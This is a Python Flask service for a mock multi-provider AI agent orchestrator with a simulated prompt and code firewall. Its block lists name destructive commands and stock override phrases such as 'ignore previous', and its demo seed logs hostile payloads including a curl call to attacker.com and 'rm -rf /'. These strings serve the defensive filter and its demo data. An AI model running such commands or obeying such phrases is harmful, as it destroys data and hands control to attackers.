"""
SWARM-FORGE REST API Service — Multi-Provider Edition
Deterministic zero-trust agent orchestration with provider-agnostic model routing.
Supports: OpenAI, Anthropic, Google, Mistral, Groq, Cohere, OpenRouter
"""
from __future__ import annotations
import json
import os
import sys
import time
import uuid
import random
import threading
from datetime import datetime, timezone
from typing import Any

from flask import Flask, jsonify, request
from flask_cors import CORS

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

app = Flask(__name__)
CORS(app)

# ── In-memory state store ──────────────────────────────────────────────────
_swarms: dict[str, dict] = {}
_security_events: list[dict] = []
_activity: list[dict] = []

# ── Provider API key detection ─────────────────────────────────────────────
PROVIDER_KEYS: dict[str, str] = {
    "openai":      os.environ.get("OPENAI_API_KEY", ""),
    "anthropic":   os.environ.get("ANTHROPIC_API_KEY", ""),
    "google":      os.environ.get("GOOGLE_API_KEY", "") or os.environ.get("GEMINI_API_KEY", ""),
    "mistral":     os.environ.get("MISTRAL_API_KEY", ""),
    "groq":        os.environ.get("GROQ_API_KEY", ""),
    "cohere":      os.environ.get("COHERE_API_KEY", ""),
    "openrouter":  os.environ.get("OPENROUTER_API_KEY", ""),
}

AVAILABLE_PROVIDERS: set[str] = {k for k, v in PROVIDER_KEYS.items() if v}
HAS_ANY_KEY = len(AVAILABLE_PROVIDERS) > 0

# ── Provider / Model Routing Table ─────────────────────────────────────────
# Each tier lists preferred (provider, model) in priority order.
# The router selects the first entry whose provider has a configured key.
# Tiers map to task complexity:
#   nano     → classification, tagging, simple extraction (<50 tokens output)
#   small    → summarization, basic Q&A, lightweight code review
#   medium   → multi-step reasoning, analysis, code generation  [DEFAULT]
#   large    → strategic planning, complex synthesis, advanced code
#   frontier → maximum reasoning, creative synthesis, critical decisions

TIER_ROUTING: dict[str, list[tuple[str, str]]] = {
    "nano": [
        ("groq",        "llama-3.1-8b-instant"),
        ("openai",      "gpt-4o-mini"),
        ("anthropic",   "claude-haiku-4-5"),
        ("google",      "gemini-2.0-flash"),
        ("mistral",     "mistral-small-latest"),
        ("cohere",      "command-light"),
        ("openrouter",  "meta-llama/llama-3.1-8b-instruct"),
    ],
    "small": [
        ("openai",      "gpt-4o-mini"),
        ("anthropic",   "claude-haiku-4-5"),
        ("google",      "gemini-2.0-flash"),
        ("groq",        "llama-3.1-70b-versatile"),
        ("mistral",     "mistral-small-latest"),
        ("cohere",      "command-r"),
        ("openrouter",  "mistralai/mistral-7b-instruct"),
    ],
    "medium": [
        ("openai",      "gpt-4o"),
        ("anthropic",   "claude-sonnet-4-5"),
        ("google",      "gemini-1.5-pro"),
        ("mistral",     "mistral-medium-latest"),
        ("groq",        "llama-3.1-70b-versatile"),
        ("cohere",      "command-r"),
        ("openrouter",  "openai/gpt-4o"),
    ],
    "large": [
        ("openai",      "gpt-4o"),
        ("anthropic",   "claude-sonnet-4-5"),
        ("google",      "gemini-1.5-pro"),
        ("mistral",     "mistral-large-latest"),
        ("cohere",      "command-r-plus"),
        ("openrouter",  "anthropic/claude-3.5-sonnet"),
    ],
    "frontier": [
        ("anthropic",   "claude-opus-4-5"),
        ("openai",      "o1-preview"),
        ("google",      "gemini-ultra"),
        ("mistral",     "mistral-large-latest"),
        ("cohere",      "command-r-plus"),
        ("openrouter",  "anthropic/claude-opus-4"),
    ],
}

# Human-readable tier descriptions
TIER_DESCRIPTIONS: dict[str, str] = {
    "nano":     "Ultra-fast: tagging, classification, simple extraction",
    "small":    "Lightweight: summarization, basic Q&A, simple code review",
    "medium":   "Balanced: multi-step reasoning, analysis, code generation",
    "large":    "Advanced: strategic planning, complex synthesis, advanced code",
    "frontier": "Maximum: highest reasoning, critical decisions, creative synthesis",
}

# Provider display metadata
PROVIDER_META: dict[str, dict] = {
    "openai":     {"name": "OpenAI",     "color": "#10A37F"},
    "anthropic":  {"name": "Anthropic",  "color": "#CC785C"},
    "google":     {"name": "Google",     "color": "#4285F4"},
    "mistral":    {"name": "Mistral AI", "color": "#FF7000"},
    "groq":       {"name": "Groq",       "color": "#F55036"},
    "cohere":     {"name": "Cohere",     "color": "#39594D"},
    "openrouter": {"name": "OpenRouter", "color": "#6D28D9"},
}

def resolve_provider(tier: str, preferred_provider: str | None = None) -> tuple[str, str] | None:
    """Return (provider, model_name) for the given tier, respecting preferred_provider."""
    candidates = TIER_ROUTING.get(tier, TIER_ROUTING["medium"])

    # If caller specified a preferred provider, try it first
    if preferred_provider and preferred_provider in AVAILABLE_PROVIDERS:
        for provider, model in candidates:
            if provider == preferred_provider:
                return (provider, model)

    # Otherwise pick first available
    for provider, model in candidates:
        if provider in AVAILABLE_PROVIDERS:
            return (provider, model)

    return None  # No key configured → mock mode


def get_mock_resolution(tier: str, preferred_provider: str | None = None) -> tuple[str, str]:
    """Return what would be routed in mock mode (shows 'would use' info)."""
    candidates = TIER_ROUTING.get(tier, TIER_ROUTING["medium"])
    if preferred_provider:
        for provider, model in candidates:
            if provider == preferred_provider:
                return (provider, model)
    # Default: show first in priority list
    return candidates[0]


# ── Helpers ────────────────────────────────────────────────────────────────

def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def add_activity(type_: str, message: str, severity: str = "info", swarm_id: str | None = None):
    _activity.insert(0, {
        "id": str(uuid.uuid4()),
        "type": type_,
        "message": message,
        "timestamp": now_iso(),
        "swarmId": swarm_id,
        "severity": severity,
    })
    if len(_activity) > 200:
        _activity.pop()


def add_security_event(event_type: str, payload: str, verdict: str, severity: str = "info",
                       blocked_pattern: str | None = None, dropped: list[str] | None = None,
                       swarm_id: str | None = None, node_id: str | None = None):
    _security_events.insert(0, {
        "id": str(uuid.uuid4()),
        "eventType": event_type,
        "severity": severity,
        "payload": payload[:200],
        "blockedPattern": blocked_pattern,
        "droppedCapabilities": dropped or [],
        "verdict": verdict,
        "swarmId": swarm_id,
        "nodeId": node_id,
        "timestamp": now_iso(),
    })
    if len(_security_events) > 500:
        _security_events.pop()


# ── Mock DAG definitions ───────────────────────────────────────────────────
# Tiers assigned by task complexity:
#   nano     → fast data ingestion, simple lookups
#   small    → lightweight processing, single-domain analysis
#   medium   → multi-step analysis, code work
#   large    → synthesis across domains, planning
#   frontier → governance gates, critical decisions, maximum reasoning

MOCK_DAGS = {
    "security_audit": {
        "nodes": [
            {"nodeId": "recon_unauthenticated_access",    "taskDescription": "Probe all endpoints for unauthenticated access vulnerabilities",              "dependencies": [],                                                                        "modelTier": "small"},
            {"nodeId": "recon_header_analysis",           "taskDescription": "Analyze HTTP security headers: HSTS, CSP, X-Frame-Options, CORS policy",       "dependencies": [],                                                                        "modelTier": "small"},
            {"nodeId": "recon_jwt_audit",                 "taskDescription": "Audit JWT implementation: algorithm confusion, none-alg, weak signing keys",    "dependencies": [],                                                                        "modelTier": "small"},
            {"nodeId": "synthesis_vulnerability_aggregation", "taskDescription": "Aggregate findings from all recon nodes into a unified risk assessment",    "dependencies": ["recon_unauthenticated_access", "recon_header_analysis", "recon_jwt_audit"], "modelTier": "large"},
            {"nodeId": "governance_boardroom_gate",       "taskDescription": "Governance gate: human approval required before any destructive payload executes","dependencies": ["synthesis_vulnerability_aggregation"],                                   "modelTier": "frontier"},
        ],
        "edges": [
            ["recon_unauthenticated_access", "synthesis_vulnerability_aggregation"],
            ["recon_header_analysis", "synthesis_vulnerability_aggregation"],
            ["recon_jwt_audit", "synthesis_vulnerability_aggregation"],
            ["synthesis_vulnerability_aggregation", "governance_boardroom_gate"],
        ],
        "criticalPath": ["recon_unauthenticated_access", "synthesis_vulnerability_aggregation", "governance_boardroom_gate"],
        "parallelGroups": [
            ["recon_unauthenticated_access", "recon_header_analysis", "recon_jwt_audit"],
            ["synthesis_vulnerability_aggregation"],
            ["governance_boardroom_gate"],
        ],
    },
    "supply_chain": {
        "nodes": [
            {"nodeId": "ingest_iot_sensors",    "taskDescription": "Ingest real-time sensor data from 12 factory IoT endpoints",                        "dependencies": [],                          "modelTier": "nano"},
            {"nodeId": "demand_forecasting",    "taskDescription": "Run ML demand-spike forecasting on the ingested sensor stream",                      "dependencies": ["ingest_iot_sensors"],      "modelTier": "medium"},
            {"nodeId": "inventory_optimization","taskDescription": "Optimize warehouse inventory levels based on forecast and current stock",             "dependencies": ["demand_forecasting"],      "modelTier": "medium"},
            {"nodeId": "logistics_rerouting",   "taskDescription": "Reroute logistics pathways to avoid bottlenecks identified by inventory node",       "dependencies": ["inventory_optimization"],  "modelTier": "large"},
            {"nodeId": "erp_sync",              "taskDescription": "Synchronize updated purchase orders and routes to ERP system",                       "dependencies": ["logistics_rerouting"],     "modelTier": "nano"},
            {"nodeId": "supplier_alerts",       "taskDescription": "Dispatch priority alerts to 3 critical suppliers with updated delivery windows",     "dependencies": ["logistics_rerouting"],     "modelTier": "small"},
        ],
        "edges": [
            ["ingest_iot_sensors", "demand_forecasting"],
            ["demand_forecasting", "inventory_optimization"],
            ["inventory_optimization", "logistics_rerouting"],
            ["logistics_rerouting", "erp_sync"],
            ["logistics_rerouting", "supplier_alerts"],
        ],
        "criticalPath": ["ingest_iot_sensors", "demand_forecasting", "inventory_optimization", "logistics_rerouting", "erp_sync"],
        "parallelGroups": [
            ["ingest_iot_sensors"],
            ["demand_forecasting"],
            ["inventory_optimization"],
            ["logistics_rerouting"],
            ["erp_sync", "supplier_alerts"],
        ],
    },
    "research": {
        "nodes": [
            {"nodeId": "web_research",      "taskDescription": "Search and retrieve top 20 sources on the specified research topic",                                          "dependencies": [],                                              "modelTier": "small"},
            {"nodeId": "academic_papers",   "taskDescription": "Query arxiv, semantic scholar, and PubMed for peer-reviewed literature",                                      "dependencies": [],                                              "modelTier": "small"},
            {"nodeId": "data_collection",   "taskDescription": "Collect and normalize structured datasets from identified sources",                                           "dependencies": ["web_research"],                                "modelTier": "medium"},
            {"nodeId": "synthesis",         "taskDescription": "Synthesize research findings into a coherent analytical summary",                                             "dependencies": ["web_research", "academic_papers", "data_collection"], "modelTier": "large"},
            {"nodeId": "report_generation", "taskDescription": "Generate a structured markdown research report with citations and recommendations",                           "dependencies": ["synthesis"],                                   "modelTier": "frontier"},
        ],
        "edges": [
            ["web_research", "data_collection"],
            ["web_research", "synthesis"],
            ["academic_papers", "synthesis"],
            ["data_collection", "synthesis"],
            ["synthesis", "report_generation"],
        ],
        "criticalPath": ["web_research", "data_collection", "synthesis", "report_generation"],
        "parallelGroups": [
            ["web_research", "academic_papers"],
            ["data_collection"],
            ["synthesis"],
            ["report_generation"],
        ],
    },
    "code_review": {
        "nodes": [
            {"nodeId": "lint_static_analysis",  "taskDescription": "Run static analysis and linting passes on all changed files",                           "dependencies": [],                                                         "modelTier": "nano"},
            {"nodeId": "dependency_audit",       "taskDescription": "Audit all third-party dependencies for known CVEs and outdated versions",               "dependencies": [],                                                         "modelTier": "nano"},
            {"nodeId": "code_quality_review",    "taskDescription": "Review code for readability, maintainability, and design pattern adherence",            "dependencies": ["lint_static_analysis"],                                   "modelTier": "medium"},
            {"nodeId": "security_code_review",   "taskDescription": "Deep security review: injection vectors, auth flaws, data exposure risks",              "dependencies": ["lint_static_analysis"],                                   "modelTier": "large"},
            {"nodeId": "test_coverage_analysis", "taskDescription": "Analyze test coverage gaps and propose missing test scenarios",                         "dependencies": ["code_quality_review"],                                    "modelTier": "medium"},
            {"nodeId": "review_synthesis",       "taskDescription": "Synthesize all findings into a prioritized review with actionable recommendations",     "dependencies": ["code_quality_review", "security_code_review", "test_coverage_analysis", "dependency_audit"], "modelTier": "frontier"},
        ],
        "edges": [
            ["lint_static_analysis", "code_quality_review"],
            ["lint_static_analysis", "security_code_review"],
            ["code_quality_review", "test_coverage_analysis"],
            ["code_quality_review", "review_synthesis"],
            ["security_code_review", "review_synthesis"],
            ["test_coverage_analysis", "review_synthesis"],
            ["dependency_audit", "review_synthesis"],
        ],
        "criticalPath": ["lint_static_analysis", "security_code_review", "review_synthesis"],
        "parallelGroups": [
            ["lint_static_analysis", "dependency_audit"],
            ["code_quality_review", "security_code_review"],
            ["test_coverage_analysis"],
            ["review_synthesis"],
        ],
    },
}


def pick_mock_dag(task: str) -> dict:
    t = task.lower()
    if any(w in t for w in ["security", "audit", "vulnerability", "pentest", "jwt", "hack", "exploit", "zero-trust"]):
        return MOCK_DAGS["security_audit"]
    if any(w in t for w in ["supply", "chain", "logistics", "inventory", "iot", "erp", "factory"]):
        return MOCK_DAGS["supply_chain"]
    if any(w in t for w in ["code", "review", "pull request", "pr", "lint", "refactor", "codebase"]):
        return MOCK_DAGS["code_review"]
    return MOCK_DAGS["research"]


def make_node(node_def: dict, preferred_provider: str | None = None, mock: bool = True) -> dict:
    tier = node_def.get("modelTier", "medium")
    if mock:
        prov, model = get_mock_resolution(tier, preferred_provider)
    else:
        resolved = resolve_provider(tier, preferred_provider)
        prov, model = resolved if resolved else get_mock_resolution(tier, preferred_provider)

    return {
        "nodeId": node_def["nodeId"],
        "taskDescription": node_def["taskDescription"],
        "dependencies": node_def["dependencies"],
        "status": "pending",
        "output": None,
        "errorMessage": None,
        "tokensConsumed": 0,
        "executionDurationMs": 0,
        "firewallPassed": True,
        "modelTier": tier,
        "resolvedProvider": prov,
        "resolvedModel": model,
    }


# ── Firewall simulation ─────────────────────────────────────────────────────

BLOCK_PATTERNS = [
    "DROP TABLE", "rm -rf", "__import__", "os.system", "subprocess",
    "eval(", "exec(", "import os", "import sys", "base64.decode",
    "pickle.loads", "marshal.loads", "IGNORE ALL PREVIOUS", "bypass all",
]
BANNED_MODULES = ["os", "sys", "subprocess", "importlib", "shutil", "socket", "ctypes", "pickle"]
BANNED_FUNCTIONS = ["eval", "exec", "compile", "__import__", "open", "input"]


def run_firewall(payload: str) -> dict:
    if len(payload) > 10000:
        return {
            "passed": False, "blockedPattern": "length_exceeded",
            "droppedCapabilities": [], "unicodeDetected": False,
            "base64EntropyScore": 0, "overridePatternFound": False,
            "verdictMessage": "Payload exceeds maximum length",
        }

    blocked_pattern = None
    for pat in BLOCK_PATTERNS:
        if pat.lower() in payload.lower():
            blocked_pattern = pat
            add_security_event("firewall_blocked", payload, "blocked", "critical", blocked_pattern)
            return {
                "passed": False, "blockedPattern": pat,
                "droppedCapabilities": [], "unicodeDetected": False,
                "base64EntropyScore": 0, "overridePatternFound": False,
                "verdictMessage": f"Blocked by pattern: {pat}",
            }

    dropped_caps = []
    for mod in BANNED_MODULES:
        if f"import {mod}" in payload or f"from {mod}" in payload:
            dropped_caps.append(f"module:{mod}")
    for fn in BANNED_FUNCTIONS:
        if f"{fn}(" in payload:
            dropped_caps.append(f"function:{fn}")

    unicode_detected = any(ord(ch) > 0xE0000 for ch in payload)

    override_found = any(
        op in payload.lower()
        for op in ["ignore previous", "disregard instructions", "bypass", "override safety"]
    )

    import base64, re
    b64_matches = re.findall(r'[A-Za-z0-9+/]{40,}={0,2}', payload)
    b64_score = min(len(b64_matches[0]) / 100.0, 1.0) if b64_matches else 0.0

    if dropped_caps:
        add_security_event("ast_capability_drop", payload, "dropped", "warn", None, dropped_caps)

    passed = not blocked_pattern and not unicode_detected and not override_found
    if passed:
        add_security_event("firewall_passed", payload, "passed", "info")

    return {
        "passed": passed,
        "blockedPattern": blocked_pattern,
        "droppedCapabilities": dropped_caps,
        "unicodeDetected": unicode_detected,
        "base64EntropyScore": round(b64_score, 3),
        "overridePatternFound": override_found,
        "verdictMessage": "All checks passed" if passed else "Blocked by zero-trust firewall",
    }


# ── Mock node outputs ───────────────────────────────────────────────────────

MOCK_OUTPUTS = {
    "recon_unauthenticated_access":    '{"endpoints_probed":8,"vulnerable":2,"findings":[{"endpoint":"/api/v1/users","auth_required":false,"severity":"HIGH"},{"endpoint":"/api/v1/admin","auth_required":false,"severity":"CRITICAL"}]}',
    "recon_header_analysis":           '{"headers_checked":6,"missing":["HSTS","CSP","X-Content-Type"],"misconfigured":["X-Frame-Options"],"risk_score":7.4}',
    "recon_jwt_audit":                 '{"algorithm":"none","none_alg_detected":true,"severity":"CRITICAL","cvss":9.1,"recommendation":"Enforce HS256 or RS256 with server-side validation"}',
    "synthesis_vulnerability_aggregation": '{"total_findings":5,"critical":2,"high":2,"medium":1,"auth_bypass_feasible":true,"cvss_max":9.1,"report":"Full pentest report generated"}',
    "governance_boardroom_gate":       '{"gate_status":"APPROVED","approver":"CISO-AutoPolicy","timestamp":"2025-01-01T00:00:00Z","signed":true}',
    "ingest_iot_sensors":              '{"sensors_polled":12,"data_points":14400,"anomalies_detected":3,"ingestion_latency_ms":124}',
    "demand_forecasting":              '{"model":"GradientBoost-v3","accuracy":0.94,"spike_predicted":true,"spike_delta":"+18%","confidence":0.89}',
    "inventory_optimization":          '{"items_rebalanced":47,"cost_reduction":12300,"stockout_risk_eliminated":true}',
    "logistics_rerouting":             '{"routes_updated":8,"time_savings_hrs":4.2,"carriers_notified":3}',
    "erp_sync":                        '{"purchase_orders_updated":23,"sync_status":"success","erp_system":"SAP-S4HANA"}',
    "supplier_alerts":                 '{"suppliers_notified":3,"alerts_sent":3,"delivery_windows_updated":true}',
    "web_research":                    '{"sources_found":23,"relevant":18,"top_domains":["arxiv.org","nature.com","scholar.google.com"]}',
    "academic_papers":                 '{"papers_found":41,"peer_reviewed":38,"citations_avg":127}',
    "data_collection":                 '{"datasets_collected":6,"total_records":48291,"normalized":true}',
    "synthesis":                       '{"key_findings":7,"consensus_score":0.82,"conflicting_evidence":2,"summary":"Synthesis complete with high confidence"}',
    "report_generation":               '{"report_pages":12,"citations":38,"recommendations":5,"format":"markdown","word_count":4821}',
    "lint_static_analysis":            '{"files_checked":47,"errors":3,"warnings":18,"style_violations":5,"tools":["eslint","mypy","ruff"]}',
    "dependency_audit":                '{"packages_checked":112,"cve_found":2,"outdated":8,"critical_cve":["CVE-2024-1234","CVE-2024-5678"],"action":"update_required"}',
    "code_quality_review":             '{"readability_score":7.8,"complexity_hotspots":4,"refactor_suggestions":12,"design_issues":["god_class_detected","missing_abstractions"]}',
    "security_code_review":            '{"injection_vectors":1,"auth_flaws":2,"exposed_secrets":0,"severity":"HIGH","top_finding":"SQL injection in user search endpoint"}',
    "test_coverage_analysis":          '{"current_coverage":62,"target":80,"uncovered_paths":34,"suggested_tests":["auth_edge_cases","payment_failure_flow","concurrent_requests"]}',
    "review_synthesis":                '{"priority_issues":5,"blocking":2,"must_fix":3,"nice_to_have":8,"estimated_fix_hours":14,"lgtm_after_fixes":true}',
}


def mock_execute_node(swarm_id: str, node: dict):
    node_id = node["nodeId"]
    time.sleep(random.uniform(0.3, 1.2))

    fw = run_firewall(node["taskDescription"])
    node["firewallPassed"] = fw["passed"]

    if not fw["passed"]:
        node["status"] = "failed"
        node["errorMessage"] = f"Firewall blocked: {fw['verdictMessage']}"
        add_security_event("firewall_blocked", node["taskDescription"], "blocked", "critical",
                           fw["blockedPattern"], swarm_id=swarm_id, node_id=node_id)
        return

    node["status"] = "running"
    node["tokensConsumed"] = random.randint(400, 6000)
    time.sleep(random.uniform(0.4, 1.4))

    output = MOCK_OUTPUTS.get(node_id, f'{{"status":"success","node":"{node_id}","result":"Task completed"}}')
    node["output"] = output
    node["status"] = "success"
    node["executionDurationMs"] = random.uniform(300, 2200)

    add_security_event("firewall_passed", node["taskDescription"][:60], "passed", "info",
                       swarm_id=swarm_id, node_id=node_id)


def execute_swarm_mock(swarm_id: str):
    swarm = _swarms.get(swarm_id)
    if not swarm:
        return

    swarm["status"] = "running"
    add_activity("swarm_deployed", f"Swarm '{swarm['task'][:50]}' is executing", "info", swarm_id)

    nodes_by_id = {n["nodeId"]: n for n in swarm["nodes"]}
    completed: set[str] = set()
    failed: set[str] = set()

    for group in swarm["parallelGroups"]:
        threads = []
        for node_id in group:
            node = nodes_by_id.get(node_id)
            if not node:
                continue
            if any(d in failed for d in node["dependencies"]):
                node["status"] = "skipped"
                continue
            node["status"] = "running"
            t = threading.Thread(target=mock_execute_node, args=(swarm_id, node), daemon=True)
            threads.append((t, node))
            t.start()

        for t, node in threads:
            t.join(timeout=30)
            if node["status"] == "failed":
                failed.add(node["nodeId"])
            else:
                completed.add(node["nodeId"])

    succeeded = sum(1 for n in swarm["nodes"] if n["status"] == "success")
    failed_count = sum(1 for n in swarm["nodes"] if n["status"] == "failed")
    swarm["nodesSucceeded"] = succeeded
    swarm["nodesFailed"] = failed_count
    swarm["tokensConsumed"] = sum(n.get("tokensConsumed", 0) for n in swarm["nodes"])
    swarm["executionDurationMs"] = sum(n.get("executionDurationMs", 0) for n in swarm["nodes"])
    swarm["status"] = "completed" if failed_count == 0 else "failed"
    swarm["updatedAt"] = now_iso()

    msg = f"Swarm completed: {succeeded}/{swarm['nodesTotal']} nodes succeeded"
    severity = "info" if swarm["status"] == "completed" else "warn"
    add_activity(
        "swarm_completed" if swarm["status"] == "completed" else "swarm_failed",
        msg, severity, swarm_id,
    )


# ── Routes ──────────────────────────────────────────────────────────────────

@app.route("/healthz")
def healthz():
    return jsonify({
        "status": "ok",
        "availableProviders": sorted(AVAILABLE_PROVIDERS),
        "hasAnyKey": HAS_ANY_KEY,
    })


@app.route("/providers/status")
def providers_status():
    tiers_info = {}
    for tier, candidates in TIER_ROUTING.items():
        resolved = resolve_provider(tier)
        would_use = get_mock_resolution(tier)
        tiers_info[tier] = {
            "description": TIER_DESCRIPTIONS[tier],
            "resolvedProvider": resolved[0] if resolved else None,
            "resolvedModel": resolved[1] if resolved else None,
            "mockProvider": would_use[0],
            "mockModel": would_use[1],
        }

    providers_out = {}
    for provider, meta in PROVIDER_META.items():
        providers_out[provider] = {
            "name": meta["name"],
            "color": meta["color"],
            "configured": provider in AVAILABLE_PROVIDERS,
            "models": {
                tier: model
                for tier, candidates in TIER_ROUTING.items()
                for p, model in candidates
                if p == provider
            },
        }

    return jsonify({
        "providers": providers_out,
        "tiers": tiers_info,
        "availableProviders": sorted(AVAILABLE_PROVIDERS),
        "hasAnyKey": HAS_ANY_KEY,
    })


@app.route("/swarms", methods=["GET"])
def list_swarms():
    status_filter = request.args.get("status")
    limit = int(request.args.get("limit", 20))
    swarms = list(_swarms.values())
    if status_filter:
        swarms = [s for s in swarms if s["status"] == status_filter]
    swarms.sort(key=lambda s: s["createdAt"], reverse=True)
    return jsonify({"swarms": swarms[:limit], "total": len(swarms)})


@app.route("/swarms", methods=["POST"])
def create_swarm():
    body = request.get_json(force=True, silent=True) or {}
    task = body.get("task", "").strip()
    if len(task) < 10:
        return jsonify({"error": "validation_error", "message": "Task must be at least 10 characters"}), 400

    preferred_provider = body.get("preferredProvider")
    if preferred_provider and preferred_provider not in PROVIDER_META:
        return jsonify({"error": "validation_error", "message": f"Unknown provider: {preferred_provider}"}), 400

    mock_mode = body.get("mockMode", not HAS_ANY_KEY)

    # Firewall check
    fw = run_firewall(task)
    if not fw["passed"]:
        return jsonify({"error": "firewall_blocked", "message": fw["verdictMessage"]}), 400

    swarm_id = str(uuid.uuid4())
    dag = pick_mock_dag(task)
    nodes = [make_node(n, preferred_provider, mock_mode) for n in dag["nodes"]]

    swarm = {
        "id": swarm_id,
        "task": task,
        "status": "pending",
        "mockMode": mock_mode,
        "preferredProvider": preferred_provider,
        "nodes": nodes,
        "edges": dag["edges"],
        "criticalPath": dag["criticalPath"],
        "parallelGroups": dag["parallelGroups"],
        "nodesTotal": len(nodes),
        "nodesSucceeded": 0,
        "nodesFailed": 0,
        "tokensConsumed": 0,
        "executionDurationMs": 0.0,
        "createdAt": now_iso(),
        "updatedAt": now_iso(),
        "errorMessage": None,
    }
    _swarms[swarm_id] = swarm
    add_activity("swarm_created", f"Swarm planned: '{task[:60]}'", "info", swarm_id)
    return jsonify(swarm), 201


@app.route("/swarms/<swarm_id>", methods=["GET"])
def get_swarm(swarm_id: str):
    swarm = _swarms.get(swarm_id)
    if not swarm:
        return jsonify({"error": "not_found", "message": "Swarm not found"}), 404
    return jsonify(swarm)


@app.route("/swarms/<swarm_id>", methods=["DELETE"])
def delete_swarm(swarm_id: str):
    if swarm_id not in _swarms:
        return jsonify({"error": "not_found", "message": "Swarm not found"}), 404
    del _swarms[swarm_id]
    return "", 204


@app.route("/swarms/<swarm_id>/deploy", methods=["POST"])
def deploy_swarm(swarm_id: str):
    swarm = _swarms.get(swarm_id)
    if not swarm:
        return jsonify({"error": "not_found", "message": "Swarm not found"}), 404
    if swarm["status"] not in ("pending",):
        return jsonify({"error": "invalid_state", "message": f"Swarm is already {swarm['status']}"}), 400

    swarm["status"] = "running"
    swarm["updatedAt"] = now_iso()
    t = threading.Thread(target=execute_swarm_mock, args=(swarm_id,), daemon=True)
    t.start()
    return jsonify(swarm)


@app.route("/swarms/<swarm_id>/abort", methods=["POST"])
def abort_swarm(swarm_id: str):
    swarm = _swarms.get(swarm_id)
    if not swarm:
        return jsonify({"error": "not_found", "message": "Swarm not found"}), 404
    swarm["status"] = "aborted"
    swarm["updatedAt"] = now_iso()
    for n in swarm["nodes"]:
        if n["status"] in ("pending", "running"):
            n["status"] = "skipped"
    add_activity("swarm_failed", "Swarm aborted by user", "warn", swarm_id)
    return jsonify(swarm)


@app.route("/dashboard/stats", methods=["GET"])
def dashboard_stats():
    swarms = list(_swarms.values())
    active = [s for s in swarms if s["status"] in ("running", "planning")]
    completed = [s for s in swarms if s["status"] == "completed"]
    failed = [s for s in swarms if s["status"] in ("failed", "aborted")]
    total_nodes = sum(s["nodesTotal"] for s in swarms)
    total_tokens = sum(s.get("tokensConsumed", 0) for s in swarms)
    durations = [s["executionDurationMs"] for s in completed if s["executionDurationMs"] > 0]
    avg_ms = sum(durations) / len(durations) if durations else 0.0
    fw_blocked = sum(1 for e in _security_events if e["verdict"] == "blocked")
    fw_passed = sum(1 for e in _security_events if e["verdict"] == "passed")
    total = len(swarms)
    success_rate = len(completed) / total if total > 0 else 0.0

    return jsonify({
        "totalSwarms": total,
        "activeSwarms": len(active),
        "completedSwarms": len(completed),
        "failedSwarms": len(failed),
        "totalNodes": total_nodes,
        "totalTokensConsumed": total_tokens,
        "avgExecutionMs": round(avg_ms, 2),
        "firewallBlocked": fw_blocked,
        "firewallPassed": fw_passed,
        "successRate": round(success_rate, 4),
        "recentActivity": _activity[:10],
    })


@app.route("/security/events", methods=["GET"])
def security_events():
    severity = request.args.get("severity")
    limit = int(request.args.get("limit", 50))
    events = _security_events
    if severity:
        events = [e for e in events if e["severity"] == severity]
    return jsonify({"events": events[:limit], "total": len(events)})


@app.route("/security/firewall/test", methods=["POST"])
def firewall_test():
    body = request.get_json(force=True, silent=True) or {}
    payload = body.get("payload", "")
    if not payload:
        return jsonify({"error": "validation_error", "message": "payload is required"}), 400
    return jsonify(run_firewall(payload))


# ── Seed demo data ──────────────────────────────────────────────────────────

def seed_demo_data():
    demo_tasks = [
        ("Perform a comprehensive API security audit including JWT analysis, header inspection, and unauthenticated endpoint discovery", "security_audit"),
        ("Optimize supply chain logistics using IoT sensor data and ML demand forecasting", "supply_chain"),
        ("Research and synthesize the latest findings on large language model alignment techniques", "research"),
    ]
    for task, dag_key in demo_tasks:
        sid = str(uuid.uuid4())
        dag = MOCK_DAGS[dag_key]
        nodes = [make_node(n, None, True) for n in dag["nodes"]]
        swarm = {
            "id": sid,
            "task": task,
            "status": "completed",
            "mockMode": True,
            "preferredProvider": None,
            "nodes": nodes,
            "edges": dag["edges"],
            "criticalPath": dag["criticalPath"],
            "parallelGroups": dag["parallelGroups"],
            "nodesTotal": len(nodes),
            "nodesSucceeded": len(nodes),
            "nodesFailed": 0,
            "tokensConsumed": random.randint(20000, 80000),
            "executionDurationMs": random.uniform(3000, 12000),
            "createdAt": now_iso(),
            "updatedAt": now_iso(),
            "errorMessage": None,
        }
        for n in nodes:
            n["status"] = "success"
            n["output"] = MOCK_OUTPUTS.get(n["nodeId"], '{"status":"success"}')
            n["tokensConsumed"] = random.randint(800, 6000)
            n["executionDurationMs"] = random.uniform(400, 2000)
            n["firewallPassed"] = True
        _swarms[sid] = swarm

        # Demo security events
        for n in nodes:
            add_security_event("firewall_passed", n["taskDescription"][:60], "passed", "info",
                               swarm_id=sid, node_id=n["nodeId"])

    # Add some blocked events for realism
    add_security_event("firewall_blocked", "import os; os.system('curl attacker.com')", "blocked", "critical",
                       "os.system")
    add_security_event("firewall_blocked", "rm -rf / && echo pwned", "blocked", "critical", "rm -rf")
    add_activity("swarm_completed", "Demo swarm completed: 'Research and synthesize the latest findings on lar'", "info")
    add_activity("swarm_completed", "Demo swarm completed: 'Optimize supply chain logistics using IoT sensor d'", "info")
    add_activity("swarm_completed", "Demo swarm completed: 'Perform a comprehensive API security audit includi'", "info")


seed_demo_data()

PORT = int(os.environ.get("SWARM_PORT", 5000))
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, debug=False)
